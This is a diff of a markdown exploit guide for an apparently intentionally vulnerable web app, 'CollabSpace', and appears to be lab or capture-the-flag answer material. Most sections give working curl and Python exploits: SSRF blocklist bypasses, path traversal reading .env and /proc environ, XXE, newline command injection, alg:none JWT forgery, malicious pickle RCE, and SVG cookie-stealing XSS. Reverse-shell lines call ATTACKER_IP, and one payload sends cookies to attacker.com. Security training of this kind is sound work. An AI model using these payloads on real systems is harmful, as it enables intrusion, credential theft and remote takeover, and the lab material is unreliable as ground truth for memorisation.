-    r = requests.post(URL, headers=headers)
-    results.append(r.json().get("api_key"))
-
-threads = [threading.Thread(target=make_request) for _ in range(10)]
-[t.start() for t in threads]
-[t.join() for t in threads]
-
-# Multiple distinct keys should appear, but only the last one is valid
-print(set(results))
-```
-
----
-
-### 19. Path Traversal — File Download
-**File:** `app/routers/files.py`, route `GET /api/files/{file_id}/download`
-**Vulnerable code (lines ~73-80):**
-```python
-if path:
-    file_path = os.path.join(settings.UPLOAD_DIR, path)  # No normalization
-    return FileResponse(path=file_path, ...)
-```
-**Why it's vulnerable:** The optional `path` query parameter is joined to the upload directory with `os.path.join`, which does not prevent traversal sequences. On Linux/Docker, absolute paths in `path` override the base entirely.
-**Difficulty:** Hard — the `path` parameter is not documented and requires source reading to discover.
-
-**Reproduce:**
+**Step 2 — Verify escalation:**
 ```bash
-# Read app configuration (relative traversal)
+curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/auth/me"
+# "role": "admin"
+```
+
+---
+
+### 8. SSRF — Webhook Blocklist Bypass via Alternative IP Representations
+**File:** `app/routers/profile.py`, route `POST /api/profile/webhook/test`
+**Vulnerable code:**
+```python
+_WEBHOOK_BLOCKED_HOSTS = {"localhost","127.0.0.1","0.0.0.0","::1","169.254.169.254",...}
+parsed = urlparse(webhook_url)
+hostname = (parsed.hostname or "").lower()
+if hostname in _WEBHOOK_BLOCKED_HOSTS:
+    raise HTTPException(400, "Internal or reserved URLs are not permitted")
+```
+**Why it's hard:** There is a visible blocklist that blocks the obvious hostnames. The bypass requires knowing that the Linux kernel and Python's `http` stack accept alternative numeric representations of `127.0.0.1` that are not in the blocklist.
+
+**Bypass options:**
+| Representation | Value |
+|---|---|
+| Decimal | `2130706433` = `127.0.0.1` |
+| Short form | `127.1` (Linux-only) |
+| Hex | `0x7f000001` |
+| IPv6-mapped | `::ffff:127.0.0.1` |
+| Octal | `0177.0.0.1` (platform-dependent) |
+
+**Step 1 — Confirm SSRF via decimal IP:**
+```bash
+curl -X POST -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/profile/webhook/test" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://2130706433/api/internal/debug"}'
+# Response: {"status": 200, "response": "{\"secret_key\":\"dev-secret-key...\",...}"}
+```
+
+**Step 2 — Internal port scan to map the network:**
+```bash
+for port in 5432 6379 8080 3306 27017; do
+  echo -n "Port $port: "
+  curl -s -X POST -b "token=<YOUR_TOKEN>" \
+    "http://localhost:8000/api/profile/webhook/test" \
+    -H "Content-Type: application/json" \
+    -d "{\"url\": \"http://127.1:$port/\"}" | jq -r '.error // .status'
+done
+```
+
+**Step 3 — Leak the JWT SECRET_KEY:**
+```bash
+curl -X POST -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/profile/webhook/test" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://127.1/api/internal/debug"}'
+```
+
+---
+
+### 9. Path Traversal — Absolute Path via `os.path.join` Semantics
+**File:** `app/routers/files.py`, route `GET /api/files/{file_id}/download?path=`
+**Vulnerable code:**
+```python
+if ".." in path:
+    raise HTTPException(400, "Invalid path")
+# BUG: os.path.join('/app/uploads', '/etc/passwd') == '/etc/passwd' on POSIX
+file_path = os.path.join(settings.UPLOAD_DIR, path)
+return FileResponse(path=file_path, ...)
+```
+**Why it's hard:** The `..` check is correct for relative traversal (`../../etc/passwd`). The bypass requires knowing a Python-specific behaviour: when the second argument to `os.path.join` is an **absolute path**, the base directory is silently discarded. No `..` sequences are required.
+
+**Step 1 — Read a sensitive file (no `..` needed):**
+```bash
+# Read the application secret key configuration
 curl -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/files/1/download?path=../../app/config.py" \
+  "http://localhost:8000/api/files/1/download?path=/app/app/config.py" \
   --output config.py
 
-# Read /etc/passwd (absolute path override on Linux)
+# Read the .env file
+curl -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/files/1/download?path=/app/.env" \
+  --output env.txt
+
+# Read /etc/passwd
 curl -b "token=<YOUR_TOKEN>" \
   "http://localhost:8000/api/files/1/download?path=/etc/passwd" \
   --output passwd.txt
-
-# Read the JWT secret key directly
-curl -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/files/1/download?path=../../.env"
 ```
 
----
-
-### 20. XXE — XML External Entity in File Processing
-**File:** `app/routers/files.py`, route `POST /api/files/process`
-**Vulnerable code (lines ~102-114):**
-```python
-from lxml import etree
-parser = etree.XMLParser(resolve_entities=True, no_network=False)
-tree = etree.fromstring(content, parser)
-```
-**Why it's vulnerable:** `lxml` is configured with `resolve_entities=True` and `no_network=False`, enabling external entity expansion. An attacker can read local files or trigger SSRF by uploading a crafted XML file.
-**Difficulty:** Hard — requires uploading an XML file to a project, then calling the process endpoint.
-
-**Reproduce:**
-1. Create `evil.xml`:
-   ```xml
-   <?xml version="1.0" encoding="UTF-8"?>
-   <!DOCTYPE foo [
-     <!ENTITY xxe SYSTEM "file:///etc/passwd">
-   ]>
-   <root>
-     <data>&xxe;</data>
-   </root>
-   ```
-2. Upload `evil.xml` to any project via the file upload form.
-3. Note the file ID returned.
-4. Call the process endpoint:
-   ```bash
-   curl -X POST -b "token=<YOUR_TOKEN>" \
-     "http://localhost:8000/api/files/process?file_id=<FILE_ID>"
-   ```
-5. The contents of `/etc/passwd` are reflected in the server response or an error message.
-
-**SSRF via XXE:**
-```xml
-<!DOCTYPE foo [
-  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
-]>
-<root><data>&ssrf;</data></root>
-```
-
----
-
-### 21. Sensitive Data Exposure — Debug Endpoint
-**File:** `app/routers/internal.py`, route `GET /api/internal/debug`
-**Vulnerable code (line ~21):**
-```python
-return {
-    "database_url": settings.DATABASE_URL,   # Contains DB credentials
-    "secret_key": settings.SECRET_KEY,        # JWT signing key
-    "upload_dir": settings.UPLOAD_DIR,
-    "environment": dict(os.environ)           # All environment variables
-}
-```
-**Why it's vulnerable:** No authentication required. Returns the JWT signing key, database URL with credentials, and the entire process environment.
-**Difficulty:** Medium — the path is under `/api/internal/` suggesting it's internal-only, making it slightly harder to find.
-
-**Reproduce:**
+**Step 2 — Extract the database password from the environment:**
 ```bash
-# No token needed
-curl "http://localhost:8000/api/internal/debug"
-
-# Extract the SECRET_KEY
-curl -s "http://localhost:8000/api/internal/debug" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['secret_key'])"
+curl -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/files/1/download?path=/proc/1/environ" \
+  --output environ.bin
+strings environ.bin | grep -i pass
 ```
-
-**Impact:** With the `SECRET_KEY`, an attacker can forge valid JWT tokens for any user, including admin accounts.
 
 ---
 
-### 22. Hardcoded JWT Secret Key
-**File:** `app/config.py`, line 18
+### 10. Command Injection — Newline Character Bypasses Metachar Filter
+**File:** `app/routers/internal.py`, route `POST /api/internal/backup?path=`
+**Vulnerable code:**
 ```python
-SECRET_KEY: str = "dev-secret-key-2023-collabspace-jwt-token"
+_BLOCKED = [";", "|", "&", "`", "$(", ">", "<"]
+for ch in _BLOCKED:
+    if ch in path:
+        raise HTTPException(400, ...)
+# BUG: \n (0x0a) is not in the blocklist; shell=True treats newline as command separator
+command = f"pg_dump ... > {path}"
+subprocess.run(command, shell=True, ...)
 ```
-**Why it's vulnerable:** Predictable, hardcoded secret key. Combined with vuln #21 (exposed via debug endpoint), attackers can forge JWT tokens.
+**Why it's hard:** The filter blocks every *classic* shell injection character. A code reviewer would likely consider this sufficient. The bypass uses the ASCII newline character (`%0a`), which bash treats identically to a semicolon as a command terminator.
 
-**Exploit (forge admin token):**
+**Step 1 — Confirm injection:**
+```bash
+# Newline-separated command: pg_dump ...\nid>/tmp/pwned.txt
+curl -X POST -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/internal/backup?path=/tmp/out%0Aid>/tmp/pwned.txt"
+
+# Verify execution
+curl -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/files/1/download?path=/tmp/pwned.txt"
+```
+
+**Step 2 — Read sensitive files:**
+```bash
+curl -X POST \
+  "http://localhost:8000/api/internal/backup?path=/tmp/x%0Acat%20/etc/passwd%20>/tmp/out2.txt"
+```
+
+**Step 3 — Reverse shell (Linux target):**
+```bash
+# URL-encode the newline and the entire payload
+curl -X POST \
+  "http://localhost:8000/api/internal/backup?path=/tmp/x%0Abash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'"
+```
+
+---
+
+### 11. JWT Algorithm Confusion — `alg:none` Unsigned Token
+**File:** `app/auth.py`, `decode_access_token()`
+**Vulnerable code:**
 ```python
-from jose import jwt
-from datetime import datetime, timedelta
+payload = jwt.decode(token, settings.SECRET_KEY, algorithms=["HS256", "none"])
+```
+**Why it's hard:** The list `["HS256", "none"]` looks like "HS256 with a fallback" to many reviewers. In JWT, `"none"` is a valid algorithm meaning *no signature*. An attacker can craft a token with `{"alg":"none"}` in the header and an arbitrary payload; the library accepts it because `"none"` is in the allowed list.
 
-SECRET = "dev-secret-key-2023-collabspace-jwt-token"
-payload = {"sub": "admin_username", "exp": datetime.utcnow() + timedelta(days=365)}
-token = jwt.encode(payload, SECRET, algorithm="HS256")
+**Step 1 — Craft an unsigned admin token (Python):**
+```python
+import base64, json
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+payload = b64url(json.dumps({"sub": "admin", "exp": 9999999999}).encode())
+token   = f"{header}.{payload}."   # empty signature
+
 print(token)
 ```
 
----
-
-### 23. Verbose Error Responses — Full Stack Traces
-**File:** `app/main.py`, lines 40-52
-```python
-return JSONResponse(
-    content={
-        "error": str(exc),
-        "type": type(exc).__name__,
-        "traceback": traceback.format_exc(),   # Full Python traceback
-        "path": str(request.url),
-        "method": request.method
-    }
-)
+**Step 2 — Use the forged token:**
+```bash
+curl -b "token=<FORGED_TOKEN>" "http://localhost:8000/api/auth/me"
+# Returns admin's profile without ever knowing the secret key
 ```
-**Why it's vulnerable:** Any unhandled exception returns a full Python traceback, revealing file paths, library versions, database schema details, and application internals.
 
-**Reproduce:** Trigger an error by passing an unexpected payload to any endpoint. The response will include the full traceback.
-
----
-
-### 24. Permissive CORS — Allow All Origins
-**File:** `app/config.py`, line 28 / `app/main.py`
+**Step 3 — Forge a token for a specific user found via IDOR (Vuln #6):**
 ```python
-CORS_ORIGINS: list = ["*"]
-allow_credentials=True
-```
-**Why it's vulnerable:** `Access-Control-Allow-Origin: *` combined with `allow_credentials=True` allows any website to make authenticated cross-origin requests, enabling cookie theft and CSRF-style attacks from JavaScript.
-
----
-
-### 25. Brute-Forceable Password Reset Token
-**File:** `app/auth.py`, lines 34-36
-```python
-def generate_reset_token() -> str:
-    token = ''.join(random.choices(string.digits, k=settings.RESET_TOKEN_LENGTH))  # 6 digits
-    return token
-```
-**Why it's vulnerable:** Only 10^6 = 1,000,000 possible values. No rate limiting on token verification. Brute-forceable in minutes.
-**Difficulty:** Hard — requires knowing the target's email and that they have an active reset request.
-
-**Reproduce:**
-```python
-import requests
-
-TARGET_EMAIL = "admin@collabspace.io"
-BASE = "http://localhost:8000"
-
-# First trigger a reset (optional if one already exists)
-requests.post(f"{BASE}/api/auth/reset-password",
-              json={"email": TARGET_EMAIL})
-
-# Brute-force all 6-digit tokens
-for i in range(1000000):
-    token = str(i).zfill(6)
-    r = requests.post(f"{BASE}/api/auth/confirm-reset", json={
-        "email": TARGET_EMAIL,
-        "token": token,
-        "new_password": "NewPass123!"
-    })
-    if r.status_code == 200:
-        print(f"[+] Token found: {token}")
-        break
+payload = b64url(json.dumps({"sub": "alice", "exp": 9999999999}).encode())
+# alice is a username found from the lookup endpoint
 ```
 
 ---
 
-### 26. Reset Token Returned in API Response
-**File:** `app/routers/auth.py`, line ~96
+### 12. Insecure Deserialisation — Python Pickle
+**File:** `app/routers/files.py`, route `POST /api/files/process?file_id=`
+**Vulnerable code:**
 ```python
-return {"message": "Reset token generated", "token": reset_token}
+elif fname.endswith('.pkl') or fname.endswith('.pickle'):
+    import pickle
+    with open(file_record.filepath, 'rb') as f:
+        raw = f.read()
+    obj = pickle.loads(raw)   # BUG: arbitrary code execution
+    return {"message": "Report loaded", ...}
 ```
-**Why it's vulnerable:** The reset token is returned directly in the HTTP response instead of being sent to the user's email. Any attacker who can observe the response (e.g., via a MITM or if the endpoint is called on the victim's behalf) obtains the token immediately.
+**Why it's hard:** The endpoint is generic (`/api/files/process`) and the pickle path is only taken for `.pkl`/`.pickle` files. There is no documentation or API schema revealing this code path. Discovery requires reading the source or fuzzing file extensions.
+
+**Step 1 — Create a malicious pickle:**
+```python
+import pickle, os
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ("id > /tmp/rce_proof.txt",))
+
+with open("exploit.pkl", "wb") as f:
+    pickle.dump(Exploit(), f)
+```
+
+**Step 2 — Upload the pickle to any project:**
+```bash
+PROJECT_ID=1
+curl -X POST -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/files/upload?project_id=$PROJECT_ID" \
+  -F "file=@exploit.pkl"
+# Note the returned file id (e.g. 42)
+```
+
+**Step 3 — Trigger deserialisation:**
+```bash
+curl -X POST -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/files/process?file_id=42"
+# Server executes os.system("id > /tmp/rce_proof.txt")
+```
+
+**Step 4 — Confirm RCE:**
+```bash
+curl -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/files/1/download?path=/tmp/rce_proof.txt"
+```
+
+**Reverse shell payload:**
+```python
+class Exploit(object):
+    def __reduce__(self):
+        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
+        return (os.system, (cmd,))
+```
+
+---
+
+### 13. Broken Function-Level Authorization — Analytics Export
+**File:** `app/routers/admin.py`, route `GET /api/analytics/export`
+**Vulnerable code:**
+```python
+@router.get("/api/analytics/export")
+async def export_analytics(
+    current_user: models.User = Depends(get_current_active_user),  # should be require_admin
+    ...
+):
+```
+**Why it's hard:** The endpoint is in the admin router but uses the wrong dependency. It is not linked from any UI and has no entry in the OpenAPI schema description. Discovery requires endpoint enumeration (e.g., `ffuf`, `dirsearch`) or reading the source.
 
 **Reproduce:**
 ```bash
-curl -X POST "http://localhost:8000/api/auth/reset-password" \
-  -H "Content-Type: application/json" \
-  -d '{"email": "victim@company.com"}'
-# Response contains {"message": "...", "token": "123456"}
+# As any authenticated (non-admin) member account
+curl -b "token=<MEMBER_TOKEN>" \
+  "http://localhost:8000/api/analytics/export"
+
+# Response includes all users' emails, roles, and API keys:
+# {"users": [{"id":1,"username":"admin","email":"admin@collabspace.io","role":"admin","api_key":"..."},...],"projects":[...]}
+```
+
+**Endpoint discovery with ffuf:**
+```bash
+ffuf -u http://localhost:8000/api/FUZZ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -H "Cookie: token=<YOUR_TOKEN>" \
+  -mc 200
 ```
 
 ---
 
-### 27. Weak Bcrypt Rounds
-**File:** `app/config.py`, line 33
+### 14. Stored XSS via SVG Avatar — Incomplete Extension Blocklist
+**File:** `app/routers/profile.py`, route `POST /api/profile/avatar`
+**Vulnerable code:**
 ```python
-PASSWORD_HASH_ROUNDS: int = 4
+_BLOCKED_AVATAR_EXTENSIONS = {'.php','.py','.sh','.html','.htm','.js',...}
+ext = os.path.splitext(filename)[1].lower()
+if ext in _BLOCKED_AVATAR_EXTENSIONS:
+    raise HTTPException(400, "File type not permitted")
+# .svg is NOT in the blocklist
 ```
-**Why it's vulnerable:** NIST recommends a minimum of 10 rounds. Using 4 rounds makes password cracking ~64× faster than using 10 rounds. Combined with the stolen hashes from vuln #1 or #2, passwords can be cracked rapidly.
+**Why it's hard:** There is an active blocklist that blocks the obvious dangerous extensions. `.svg` is a legitimate image format and is allowed by the HTML `accept="image/*"` attribute — the oversight is non-obvious to developers unfamiliar with SVG's script execution model.
+
+**Step 1 — Create a malicious SVG:**
+```xml
+<!-- evil.svg -->
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
+  <text x="10" y="20">Profile Picture</text>
+</svg>
+```
+
+**Step 2 — Bypass the client-side `accept="image/*"` restriction and upload:**
+```bash
+curl -X POST -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/profile/avatar" \
+  -F "file=@evil.svg;type=image/svg+xml"
+```
+
+**Step 3 — Trigger XSS:**
+- Navigate to your profile page — the SVG `onload` fires immediately.
+- If another user views your profile via the admin user lookup, the payload fires in their browser too.
+
+**Step 4 — Persistent cookie-stealing payload:**
+```xml
+<svg xmlns="http://www.w3.org/2000/svg"
+     onload="fetch('https://attacker.com/?c='+document.cookie)">
+  <text x="10" y="20">Avatar</text>
+</svg>
+```
+
+---
+
+### 15. Password Reset Token — Leaked via Debug Response Header
+**File:** `app/routers/auth.py`, route `POST /api/auth/reset-password`
+**Vulnerable code:**
+```python
+if settings.DEBUG:
+    response.headers["X-Debug-Token"] = reset_token
+return {"message": "If the email exists, a reset link has been sent."}
+```
+**Why it's hard:** The JSON body is uniform (same message whether the email exists or not). The token is not in the body. A tester relying solely on the response body will miss this — the `X-Debug-Token` header requires explicitly inspecting response headers. `DEBUG=True` is set by default.
+
+**Step 1 — Request a reset and inspect response headers:**
+```bash
+curl -v -X POST "http://localhost:8000/api/auth/reset-password" \
+  -H "Content-Type: application/json" \
+  -d '{"email": "admin@collabspace.io"}' 2>&1 | grep -i "x-debug"
+# < X-Debug-Token: 47281934
+```
+
+**Step 2 — Use the leaked token to reset the password:**
+```bash
+curl -X POST "http://localhost:8000/api/auth/confirm-reset" \
+  -H "Content-Type: application/json" \
+  -d '{"email": "admin@collabspace.io", "token": "47281934", "new_password": "H@ck3d123!"}'
+```
+
+**Step 3 — Log in with the new credentials:**
+```bash
+curl -c cookies.txt -X POST "http://localhost:8000/api/auth/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": "H@ck3d123!"}'
+```
 
 ---
 
 ## Chained Attack Scenarios
 
-### Scenario A: Unauthenticated to Admin RCE
-1. **Vuln #21** — `GET /api/internal/debug` → steal `SECRET_KEY`
-2. **Vuln #22** — forge an admin JWT token
-3. **Vuln #14** — `POST /api/admin/fetch-url` → SSRF to confirm internal access
-4. **Vuln #3** — `POST /api/internal/backup?path=...;SHELL_CMD` → Remote Code Execution
+### Scenario A: Unauthenticated → Admin → RCE
+1. **Vuln #15** — `POST /api/auth/reset-password` on `admin@collabspace.io` → steal token from `X-Debug-Token` header → reset admin password → login
+2. **Vuln #10** — `POST /api/internal/backup?path=/tmp/x%0Aid>/tmp/out.txt` → confirm command execution
+3. **Vuln #10** — deploy reverse shell via newline-injected payload
 
-### Scenario B: Member to Admin
+### Scenario B: Member → Admin (No Interaction)
 1. Register a member account
-2. **Vuln #17** — `PUT /api/profile/update` with `{"role": "admin"}` → become admin
-3. Access all admin endpoints
+2. **Vuln #7** — `PUT /api/profile/update` with `{"account_settings":{"_permission_level":"elevated"}}` → become admin
+3. Access all admin-only endpoints (`/api/admin/execute-query`, etc.)
 
-### Scenario C: Account Takeover via XSS
-1. **Vuln #4** — Post a comment with cookie-stealing payload
-2. Victim loads the task → their session cookie is sent to attacker
-3. Attacker uses stolen cookie to authenticate as victim
+### Scenario C: Persistent Account Takeover via XSS Chain
+1. **Vuln #14** — upload `evil.svg` as avatar
+2. Admin visits profile → SVG fires, steals admin cookie
+3. Attacker authenticates as admin using stolen session cookie
 
-### Scenario D: Data Exfiltration via SQLi
-1. **Vuln #2** — `POST /api/admin/execute-query` (no auth needed): `curl -X POST http://localhost:8000/api/admin/execute-query --data-urlencode "query=SELECT id,username,email,hashed_password FROM users"`
-2. All credentials are returned in plaintext JSON
-3. **Vuln #27** — Crack bcrypt hashes using hashcat or john (only 4 rounds — ~64× faster than standard 10 rounds)
+### Scenario D: Blind Data Exfiltration
+1. **Vuln #1** — time-based blind SQLi on `GET /api/tasks?direction=` → enumerate users table character by character
+2. Recover password hashes and crack them (bcrypt with default 4 rounds — ~64× faster than standard)
+
+### Scenario E: SSRF → Internal Secrets → JWT Forgery
+1. **Vuln #8** — `POST /api/profile/webhook/test` with `{"url":"http://127.1/api/internal/debug"}` → leak `SECRET_KEY`
+2. **Vuln #11** (alternative) — Now that you have the secret, forge an HS256 token for any user instead of using `alg:none`
+3. Access any account without credentials
 
 ---
 
